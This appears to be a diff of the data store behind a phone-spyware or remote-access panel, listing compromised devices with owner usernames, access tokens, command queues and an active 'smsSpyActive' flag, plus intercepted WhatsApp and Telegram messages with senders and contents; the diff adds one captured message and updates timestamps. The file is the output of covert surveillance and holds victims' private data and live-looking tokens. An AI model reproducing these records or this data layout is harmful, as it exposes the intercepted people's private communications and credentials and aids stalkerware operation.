@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776773550756,
+    "lastSeen": 1776773554743,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776773550131,
+    "lastSeen": 1776773553473,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776773549052,
+    "lastSeen": 1776773552062,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "bintang",
+        "content": "ya",
+        "time": "21/04 19:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776773554851
+      },
       {
         "appName": "Telegram",
         "sender": "LearnTermuxHUB.Tools: 𝐃𝐈𝐓𝐙 𝐆𝐀𝐍𝐓𝐄𝐍𝐆",
@@ -14394,14 +14402,6 @@
         "time": "21/04 18:16",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776770207216
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗞𝗮𝘁𝗶𝗹 𝗩𝗜𝗣 𝗣𝗿𝗲𝗱𝗶𝗰𝘁𝗶𝗼𝗻 📈",
-        "content": "🕯📈HIGHEST DEPOSIT KARKE READy Raho! 💯\n\nRegister Link 🔗👇\nhttps://www.jaiclub35.com/#/register?invitationCode=37557112869\n\n⚠️ Jo Bhi New Member ho Yah Video Dekh Lo Kaise Khelna Hai Samajh Jaaoge ⚠️",
-        "time": "21/04 18:16",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776770204790
       }
     ],
     "galleryPhotos": [],
